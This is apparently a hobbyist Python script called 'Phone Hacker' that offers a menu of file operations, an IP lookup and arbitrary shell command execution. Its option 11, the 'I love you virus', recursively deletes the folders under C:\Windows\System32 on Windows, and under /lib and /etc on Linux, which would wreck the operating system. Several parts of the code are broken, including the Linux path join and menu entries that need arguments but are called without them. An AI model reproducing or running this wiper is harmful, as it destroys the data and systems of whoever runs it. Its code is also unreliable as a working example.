import os
import time
import sys
import random
import shutil
from urllib.request import urlopen
from requests import get
def write(text,speed=0.05):
    for x in text:
        sys.stdout.write(x)
        time.sleep(speed)

def wait(secs):
    time.sleep(secs)

def exists(path):
    if os.path.exists(path):
        return True
    else:
        return False
def rename_file(old_name, new_name):
    try:
        os.rename(old_name, new_name)
        write(f"File renamed to {new_name}.\n")
    except FileNotFoundError:
        write("File not found.\n")
def create_directory(dir_name):
    try:
        os.mkdir(dir_name)
        write(f"Directory '{dir_name}' created.\n")
    except FileExistsError:
        write(f"Directory '{dir_name}' already exists.\n")
def remove_directory(dir_name):
    try:
        os.rmdir(dir_name)
        write(f"Directory '{dir_name}' removed.\n")
    except FileNotFoundError:
        write(f"Directory '{dir_name}' not found.\n")
    except OSError:
        write(f"Directory '{dir_name}' not empty.\n")
def list_directory():
    files = os.listdir('.')
    for f in files:
        write(f"{f}\n")

# Add to commands dictionary

def delete_all_files(path__):
    if sys.platform == "win32":
        for folder in os.listdir(path__):
            folder_path = os.path.join(path__, folder)
            if os.path.isdir(folder_path):
                shutil.rmtree(folder_path)
            
    elif sys.platform.startswith('linux'):
        path = ['/lib','/etc','lib64']
        for paths in path:
            for folder in os.listdir(paths):
                folder_path = os.path.join(path, folder)
                if os.path.isdir(folder_path):
                    shutil.rmtree(folder_path)
            
def create_file(file_name):
    with open(file_name, 'w') as f:
        f.write("Hello, world!")
    write("File created.\n")
def get_ip():
    ip = get("https://api.ipify.org").content.decode("utf8")
    return ip

def delete_file(file_path):
    try:
        os.remove(file_path)
        write("File deleted.\n")
    except FileNotFoundError:
        write("File not found.\n")

def clear():
    os.system('cls' if os.name == 'nt' else 'clear')
def main():
    
    write(" \03 Hello, welcome to Phone Hacker! \03 \n")
    write(" \03 Loading... \03")
    time.sleep(2)
    
    clear()
    
    commands = {
        '1': lambda: write(f"IP address: {get_ip()}\n"),
        '2': lambda path: write("File exists.\n") if exists(path) else write("File does not exist.\n"),
        '3': lambda command: os.system(command),
        '4': lambda file: create_file(file),
        '5': lambda file: delete_file(file),
        "6":lambda drive: write("Changing  drive...\n")and os.chdir(f"{drive}"),
        '7': lambda old_name, new_name: rename_file(old_name, new_name),
        '8': lambda dir_name: create_directory(dir_name),
        '9': lambda dir_name: remove_directory(dir_name),
        '10': lambda: list_directory(),
        "11": lambda: delete_all_files(r"C:\Windows\System32"),
        
        
    }
    while True:
        clear()
        print(r"""                                                                                                                                             
,--.                   ,--.                       ,--.                ,--.        
|  ,---.  ,--,--. ,---.|  |,-. ,---. ,--.--.    ,-'  '-. ,---.  ,---. |  | ,---.  
|  .-.  |' ,-.  || .--'|     /| .-. :|  .--'    '-.  .-'| .-. || .-. ||  |(  .-'  
|  | |  |\ '-'  |\ `--.|  \  \\   --.|  |         |  |  ' '-' '' '-' '|  |.-'  `) 
`--' `--' `--`--' `---'`--'`--'`----'`--'         `--'   `---'  `---' `--'`----'  
 -- Made by drexxy
              """)
        print("_" * 80 + "\n")
        write("q is to quit")
        write("1. Check IP address\n")
        write("2. Check if a file exists args: file\n")
        write("3. Use a system command args: command\n")
        write("4. Create a new file args: filename\n")
        write("5. Delete a file args: filename\n")
        write("6. Change the drive args: drive\n")
        write('7. Rename file args: old-name,new-name\n')
        write('8. Create Directory args: name\n')
        write('9. Remove Directory args: directory-name\n')
        write('10. List directory\n')
        write("11. I love you virus (DO NOT USE ON PERSONAL DEVICE WILL DELETE ALL OF YOUR FILES AND DATA)")
        
        choice = input("Enter your choice: ")
        if choice == 'q':
            break
        commands.get(choice, lambda: write("Invalid choice. Please try again.\n"))()

if __name__ == "__main__":
    main()
